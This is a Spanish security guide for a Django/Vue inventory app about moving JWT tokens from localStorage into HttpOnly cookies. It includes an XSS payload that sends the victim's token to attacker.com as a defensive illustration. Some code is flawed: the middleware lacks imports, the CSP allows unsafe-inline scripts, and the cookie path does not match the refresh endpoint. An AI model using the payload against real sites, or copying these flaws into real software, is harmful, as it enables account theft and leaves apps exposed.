---
name: auth-security-best-practices
description: >
  Guía de seguridad crítica para gestión de tokens JWT y prevención de ataques XSS, CSRF,
  token theft. Recomendaciones implementadas en Nurax Inventario basadas en OWASP.
---

# 🔐 Autenticación Segura — JWT + HttpOnly Cookies

> **Última actualización:** 4 Abril 2026
> **Estado:** ⚠️ VULNERABILIDAD CRÍTICA IDENTIFICADA — localStorage NO es seguro
> **Experto de Seguridad:** Análisis de ciberseguridad y prevención de fatalities

---

## 🚨 VULNERABILIDAD CRÍTICA ACTUAL: localStorage + XSS

### ❌ Problema Actual
```typescript
// ❌ INSEGURO - Implementación Actual
localStorage.setItem('access_token', token)  // Token VISIBLE para JavaScript
localStorage.setItem('refresh_token', token) // Atacantes lo roban con XSS
```

### Riesgos Identificados

| Ataque | Severidad | Descripción | Impacto |
|--------|-----------|-------------|--------|
| **XSS (Cross-Site Scripting)** | 🔴 CRÍTICA | JS inyectado en DOM accede al token | Robo total del token, acceso a cuenta |
| **Token Theft via localStorage** | 🔴 CRÍTICA | `document.localStorage.getItem('access_token')` | Atacante impersona usuario |
| **Session Hijacking** | 🔴 CRÍTICA | Token capturado → uso en otra máquina | Acceso no autorizado indefinido |
| **CSRF (Cookie-based)** | 🟠 ALTA | Petición no autorizada desde otra página | Manipulación de datos del usuario |
| **Token Tampering** | 🟠 MEDIA | Modificación de token en transit | Detectada por validación JWT |

### Escenario de Ataque XSS Real

```javascript
// 1. Atacante inyecta en comentario de producto:
<img src=x onerror="fetch('https://attacker.com?token=' + localStorage.getItem('access_token'))">

// 2. Cuando usuario carga la página, XSS se ejecuta
// 3. Token se envía a servidor del atacante
// 4. Atacante usa el token para:
//    - Acceder a inventario completo
//    - Crear ventas falsas
//    - Eliminar productos
//    - Cambiar configuración de tienda
//    - Robar datos de clientes
```

---

## ✅ SOLUCIÓN RECOMENDADA: HttpOnly + Secure Cookies

### Por qué HttpOnly es Seguro

```
┌─────────────────────────────────────────────────┐
│ localStorage                                     │
├─────────────────────────────────────────────────┤
│ ✗ Accesible desde JavaScript                   │
│ ✗ Vulnerable a XSS                             │
│ ✗ No se envía automáticamente en requests       │
│ ✗ Persiste sin expiración                       │
└─────────────────────────────────────────────────┘

                        VS

┌─────────────────────────────────────────────────┐
│ Cookies HttpOnly + Secure                       │
├─────────────────────────────────────────────────┤
│ ✓ NO accesible desde JavaScript                │
│ ✓ Resistente a XSS (¡el atacante no lo ve!)    │
│ ✓ Se envía AUTOMÁTICAMENTE en cada request     │
│ ✓ Requiere HTTPS (flag Secure)                 │
│ ✓ Incluye SameSite (previene CSRF)             │
│ ✓ Expiración controlada por servidor           │
└─────────────────────────────────────────────────┘
```

### Flags Críticas de Seguridad

```http
Set-Cookie: access_token=eyJhbGci...; 
  HttpOnly;           /* ← No accesible desde JavaScript */
  Secure;             /* ← Solo se envía por HTTPS */
  SameSite=Strict;    /* ← Previene CSRF */
  Max-Age=3600;       /* ← Expira en 1 hora */
  Path=/api;          /* ← Solo se envía a /api/* */
  Domain=.nurax.com;  /* ← Dominio específico */
```

### Explicación de Cada Flag

| Flag | Propósito | Impacto de Seguridad |
|------|-----------|---------------------|
| `HttpOnly` | Impide acceso desde `document.cookie` | 🔴 CRÍTICA — Previene XSS token theft |
| `Secure` | Solo se envía por HTTPS | 🟠 ALTA — Previene Man-in-the-Middle |
| `SameSite=Strict` | No se envía en peticiones cross-site | 🟠 ALTA — Previene CSRF |
| `Max-Age` | Expiración automática por servidor | 🟢 MEDIA — Limita ventana de riesgo |
| `Path=/api` | Solo accesible en endpoints de API | 🟢 MEDIA — Reduce superficie de ataque |

---

## 🔄 Flujo de Autenticación Segura (HttpOnly)

### 1️⃣ **Login**
```
Frontend (Vue)
├── POST /auth/login { email, password }
│
└─→ Backend (Django)
    ├── Valida credenciales
    ├── Genera access_token (JWT, 15min)
    ├── Genera refresh_token (JWT, 30 días)
    ├── Responde:
    │   Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Strict
    │   Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Strict; Path=/auth
    │   { success: true, user: {...} }
    └── Frontend NO ve el token (¡está en HTTP-only cookie!)
```

### 2️⃣ **Request Autenticado (automático)**
```
Frontend (Vue)
├── GET /api/v1/products/products/
│   ↓ Browser envía cookies automáticamente
│   Cookie: access_token=eyJhbGci... (HttpOnly, no visible desde JS)
│
└─→ Backend (Django)
    ├── Extrae token de cookie
    ├── Valida JWT
    ├── Retorna datos protegidos
```

### 3️⃣ **Token Expirado → Refresh Automático**
```
Frontend (Vue) - 401 Unauthorized
├── POST /auth/refresh/
│   Cookie: refresh_token=eyJhbGci... (enviada automáticamente)
│
└─→ Backend (Django)
    ├── Valida refresh_token
    ├── Genera nuevo access_token
    ├── Responde:
    │   Set-Cookie: access_token=...; HttpOnly; Secure; (NUEVO)
    └── Frontend reintenta petición original con nuevo token
```

### 4️⃣ **Logout (Limpiar Cookies)**
```
Frontend (Vue)
├── GET /auth/logout/
│
└─→ Backend (Django)
    ├── Responde:
    │   Set-Cookie: access_token=; Max-Age=0; HttpOnly; Secure;
    │   Set-Cookie: refresh_token=; Max-Age=0; HttpOnly; Secure;
    │   (Expira la cookie inmediatamente)
```

---

## 📋 Implementación en Django

### 1. Backend - Configurar Respuesta con Cookies

```python
# nurax_backend/utils/auth_utils.py
from django.http import JsonResponse
from datetime import timedelta
from rest_framework_simplejwt.tokens import RefreshToken

def login_with_cookies(user):
    """Genera tokens JWT y los envía como HttpOnly cookies"""
    refresh = RefreshToken.for_user(user)
    access = str(refresh.access_token)
    
    response = JsonResponse({
        'success': True,
        'user': {
            'id': user.id,
            'email': user.email,
            'username': user.username,
        }
    })
    
    # HTTP-only cookies (NO accesibles desde JavaScript)
    response.set_cookie(
        'access_token',
        access,
        max_age=15 * 60,  # 15 minutos
        httponly=True,
        secure=True,  # Solo HTTPS en producción
        samesite='Strict',
        path='/api'
    )
    
    response.set_cookie(
        'refresh_token',
        str(refresh),
        max_age=30 * 24 * 60 * 60,  # 30 días
        httponly=True,
        secure=True,
        samesite='Strict',
        path='/api/auth'  # Solo para refresh
    )
    
    return response
```

### 2. Backend - Extraer Token de Cookie en Requests

```python
# nurax_backend/middleware/auth_middleware.py
from django.contrib.auth import get_user_model
from rest_framework.authentication import TokenAuthentication
import jwt

class CookieJWTAuthentication(TokenAuthentication):
    """Autentica usando JWT desde HttpOnly cookies"""
    
    def authenticate(self, request):
        # Intenta obtener token de:
        # 1. Cookie HttpOnly (preferido)
        # 2. Header Authorization (fallback para testing)
        
        auth_token = (
            request.COOKIES.get('access_token') or
            request.META.get('HTTP_AUTHORIZATION', '').replace('Bearer ', '')
        )
        
        if not auth_token:
            return None
        
        try:
            payload = jwt.decode(auth_token, settings.SECRET_KEY, algorithms=['HS256'])
            user = get_user_model().objects.get(id=payload['user_id'])
            return (user, auth_token)
        except (jwt.InvalidTokenError, get_user_model().DoesNotExist):
            raise AuthenticationFailed('Token inválido o expirado')
```

### 3. Django Settings - Configuración de Seguridad

```python
# nurax_backend/settings.py

# ✅ CSRF Protection
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = 'Strict'

# ✅ Session Cookies
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Strict'

# ✅ CORS - Solo dominio permitido
CORS_ALLOWED_ORIGINS = [
    "https://nurax.com",
    "https://www.nurax.com",
]

# ✅ HTTPS en producción
SECURE_SSL_REDIRECT = True  # Fuerza redirect HTTP → HTTPS
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ("'self'",),
    'script-src': ("'self'", "'unsafe-inline'"),  # Considera script-src-attr
    'style-src': ("'self'", "'unsafe-inline'"),
    'img-src': ("'self'", "data:", "https:"),
}
```

---

## 📋 Implementación en Frontend (Vue 3)

### ✅ Con HttpOnly - Simplificado

```typescript
// src/services/api.ts
class ApiClient {
  private baseUrl: string

  constructor(baseUrl: string) {
    this.baseUrl = baseUrl
  }

  private async request<T>(
    method: string,
    endpoint: string,
    config?: RequestConfig
  ): Promise<ApiResponse<T>> {
    try {
      let url = new URL(`${this.baseUrl}${endpoint}`)
      
      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
      }

      // ✓ NO necesitamos obtener el token manualmente
      // El navegador envía la cookie automáticamente
      // (solo si credentials: 'include')

      const fetchOptions: RequestInit = {
        method,
        headers,
        credentials: 'include',  // ← CRÍTICA: Envía cookies
        ...config,
      }

      let response = await fetch(url.toString(), fetchOptions)

      // Auto-refresh en 401
      if (response.status === 401 && !endpoint.includes('/auth/login/')) {
        try {
          const refreshResponse = await fetch(
            `${this.baseUrl}/auth/refresh/`,
            {
              method: 'POST',
              credentials: 'include',  // ← Envía refresh_token cookie
            }
          )

          if (refreshResponse.ok) {
            // Backend actualizó el access_token cookie automáticamente
            // Reintentar petición original
            response = await fetch(url.toString(), fetchOptions)
          } else {
            // Refresh falló → redirigir a login
            window.location.href = '/auth/login'
          }
        } catch (e) {
          window.location.href = '/auth/login'
        }
      }

      const responseText = await response.text()
      let data: any = null
      
      try {
        if (responseText) data = JSON.parse(responseText)
      } catch (e) {
        console.warn('Response is not JSON', responseText)
      }

      return {
        success: response.ok,
        data: data as T,
        error: response.ok ? undefined : data?.detail || response.statusText,
        status: response.status,
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || 'Error de red',
      }
    }
  }

  get<T>(endpoint: string, config?: RequestConfig): Promise<ApiResponse<T>> {
    return this.request<T>('GET', endpoint, config)
  }

  post<T>(endpoint: string, body?: any, config?: RequestConfig): Promise<ApiResponse<T>> {
    return this.request<T>('POST', endpoint, { ...config, body })
  }

  // ... otros métodos igual
}

export default new ApiClient(
  import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000/api'
)
```

### ✅ Auth Composable Simplificado

```typescript
// src/composables/useAuth.ts
import { ref } from 'vue'
import authService from '@/services/auth.service'

const isAuthenticated = ref(false)
const currentUser = ref(null)

export function useAuth() {
  const login = async (email: string, password: string) => {
    try {
      const res = await authService.login({ email, password })
      
      if (!res.success) {
        return { success: false, error: res.error }
      }

      // Backend envió tokens en cookies HttpOnly
      // No necesitamos guardarlos en localStorage
      isAuthenticated.value = true
      currentUser.value = res.data.user

      return { success: true, user: res.data.user }
    } catch (error: any) {
      return { success: false, error: error.message }
    }
  }

  const logout = async () => {
    // Backend limpia las cookies estableciendo Max-Age=0
    await authService.logout()
    isAuthenticated.value = false
    currentUser.value = null
  }

  const checkSession = async () => {
    // Backend lee cookie access_token del navegador
    // Si es válida, retorna datos del usuario
    const res = await authService.fetchUser()
    if (res.success && res.data) {
      isAuthenticated.value = true
      currentUser.value = res.data
    } else {
      logout()
    }
  }

  return {
    isAuthenticated,
    currentUser,
    login,
    logout,
    checkSession,
  }
}
```

---

## 📊 Comparativa: localStorage vs HttpOnly Cookies

| Aspecto | localStorage | HttpOnly Cookies |
|--------|-------------|------------------|
| **Accesible desde JS** | ✗ SÍ (vulnerable) | ✓ NO (seguro) |
| **XSS Risk** | 🔴 CRÍTICA | 🟢 PROTEGIDA |
| **Enviado automáticamente** | ✗ Manual | ✓ Automático |
| **Control de expiración** | ✗ Manual | ✓ Servidor |
| **CSRF Protection** | ✗ NO | ✓ SameSite |
| **HTTPS Required** | ✗ NO | ✓ SÍ (Secure) |
| **Visible en Dev Tools** | ✓ SÍ | ✓ SÍ (pero no accesible desde JS) |

---

## 🛡️ Checklist de Seguridad Implementada

- [ ] Tokens en **HttpOnly cookies** (NO en localStorage)
- [ ] Flag `Secure` habilitada (HTTPS only)
- [ ] Flag `SameSite=Strict` (previene CSRF)
- [ ] `Path` limitado a `/api` (reduce superficie de ataque)
- [ ] `Max-Age` configurado (expiración automática)
- [ ] Refresh token con Path=/auth (más restrictivo)
- [ ] `credentials: 'include'` en fetch (envía cookies)
- [ ] CORS configurado restrictivamente
- [ ] Content-Security-Policy headers activos
- [ ] HTTPS forzado en producción
- [ ] Token refresh automático en 401
- [ ] Logout limpia cookies (Max-Age=0)

---

## 🚨 Mitigaciones Adicionales contra XSS

Aunque HttpOnly cookies protejan el token, sigue siendo crítico prevenir XSS:

### 1. Sanitizar Input
```typescript
// ✓ Usar innerText en lugar de innerHTML
element.innerText = userInput  // Seguro
element.innerHTML = userInput  // ✗ PELIGROSO
```

### 2. Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data: https:
```

### 3. DOMPurify para Contenido Dinámico
```typescript
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(userInput)
element.innerHTML = clean
```

### 4. Validar en Backend
```python
# Django serializers
class ProductSerializer(serializers.ModelSerializer):
    def validate_description(self, value):
        # Sanitizar en backend también
        if len(value) > 500:
            raise ValidationError("Descripción muy larga")
        return value
```

---

## 📚 Referencias OWASP

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## ✅ Plan de Implementación

### Fase 1: Backend (Django)
```
1. Crear auth_utils.py con login_with_cookies()
2. Actualizar AuthenticationBackend → CookieJWTAuthentication
3. Configurar settings.py con flags de seguridad
4. Testear login, refresh, logout
```

### Fase 2: Frontend (Vue)
```
1. Actualizar ApiClient.ts → credentials: 'include'
2. Remover localStorage token handling
3. Simplificar useAuth.ts
4. Testar flujo completo end-to-end
```

### Fase 3: Validación
```
1. Verificar que localStorage NO contiene tokens
2. Verificar cookies HttpOnly en DevTools
3. Testear XSS: inyectar <img onerror> → confirmar que NO se roba token
4. Load testing con refresh automático
```

---

## 🔐 Conclusión

**HttpOnly cookies + Secure + SameSite** es el estándar de industria para proteger tokens JWT. 

**localStorage NO es aceptable** para datos sensibles como tokens de autenticación.

Este cambio requiere coordinación backend-frontend pero **es crítico para la seguridad de la aplicación**.
